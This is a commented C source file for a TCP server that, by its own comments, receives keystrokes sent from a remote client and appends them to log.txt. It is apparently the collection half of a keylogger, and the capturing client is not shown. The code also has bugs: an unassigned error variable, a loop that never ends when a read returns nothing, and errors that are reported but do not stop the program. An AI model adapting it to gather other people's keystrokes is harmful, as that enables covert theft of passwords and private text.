/* A simple server in the internet domain using TCP
   The port number is passed as an argument */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>         // struct sockaddr_in is defined here

int main(int argc, char *argv[])
{
        // this is used for keystroke storage
        FILE* filePtr = NULL;

        /*
                sockFD and newSockFD are file descriptors. It is basically a handle
                by which a Unix/Linux process handles accessing files, I/O, or sockets.
                portNumber is the portNumber to which the server will be listening to.
        */

        int sockFD, newSockFD, portNumber;
        /*
                clientLen is the size of the address of the client.
                It is a 32 bit unsigned int.
        */
        socklen_t clientLen;

        char buffer[256];       // this will hold data to be sent

        /*
                serv_addr and cli_addr hold information about the endpoints
                from which or to which the connection is established
        */
        struct sockaddr_in serv_addr, cli_addr;
        int n;

        // ensure correct usage
        if (argc < 2) {
                perror("Usage: ./a.out port");
                return 1;
        }

        /*
                socket() function creates an endpoint for communication.
                It returns a file descriptor referring to that endpoint.
                int socket(int domain, int type, int protocol); is the declaration.
                domain - the internet communication protocol family. AF_INET refers
                to IPv4. On an unsuccessful attempt, -1 is returned.
        */
        sockFD = socket(AF_INET, SOCK_STREAM, 0);
		// sanity check to ensure end point creation
        if (sockFD < 0)
                perror("Socket could not be opened");

        // initialize serv_addr to zeros
        bzero((char *) &serv_addr, sizeof(serv_addr));

        // argv[1], command line argument has to be noverted to digits
        // rather than a string of digits as it is by default.
        portNumber = atoi(argv[1]);

        /*
                the instance of struct sockaddr_in, serv_addr is filled with the
                domain of communication, IP address of the machine and the port number
                but it is first converted to network byte order from the the native
                representation byte order. INADDR_ANY holds the value of the IP of the
                machine.
        */
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(portNumber);

        //      bind() function will bind the local file descriptor sockFD
        //      to the local server information(Protocol, IP, Port). Typecast
        //  is used to convert sockaddr_in to sockaddr type, passing as an address
        //      -1 is returned on unsuccessful binding operation.
        if (bind(sockFD, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
                perror("ERROR on binding");

        //      listen for connections on the socket (server end point)
        listen(sockFD, 5);

        //      the size of the struct sockaddr_in is used multiple times below
        //      so it could be kept in its own separate variable
        clientLen = sizeof(cli_addr);
		//      the code execution stops until a client, a remote machine connects
        //      to this server. The first argument is the local socket file descriptor
        //      The second is the address of the file descriptor of the client, and
        //      the size of the struct that we kept in a variable above. Return value
        //      is a new file descriptor that must be used for subsequent communication
        //      between the client and the server. -1 is returned on error
        newSockFD = accept(sockFD, (struct sockaddr *) &cli_addr, &clientLen);

        // sanity check
        if (newSockFD < 0)
                perror("ERROR on accept");

        //      initialize buffer to zeros. It will hold kestrokes sent from the client
        bzero(buffer,256);

        // the server must stay running
        while(1)
        {
                //      at every execution the buffer must be empty
                bzero(buffer,256);

                //      read will block until the client sends something.
                //      it uses the new file descriptor returned by the accept function
                //      it will copy the data receoved to the buffer.
                //      it will return the number of bytes read. -1 is returned on
                //      unsuccessful execution. And, if it happens, the server goes back to
                //      listening mode, waiting for a new connection.
                if((read(newSockFD, buffer, 255)) >= 0)
                {
				//  the data received is to be written to a file
                        //      open the file
                        filePtr = fopen("log.txt", "a+");

                        // just a sanity check
                        if(filePtr == NULL)
                        {
                                printf("Error opening the file");
                                return 1;
                        }

                        //      write the buffer to a file
                        fprintf(filePtr, "%s", buffer);

                        //      close the file
                        fclose(filePtr);
                }else
                {
                        //      do the same as before the while(1) loop, switch to listening mode
                        listen(sockFD, 5);
                        clientLen = sizeof(cli_addr);
                        newSockFD = accept(sockFD, (struct sockaddr *) &cli_addr, &clientLen);
                        if (newSockFD < 0)
                                perror("Error accepting a connection");
                }

                if (n < 0)
                        perror("ERROR reading from socket");
        }
        // close the communication socket
		close(newSockFD);

        // close the local socket
        close(sockFD);
    return 0;
}
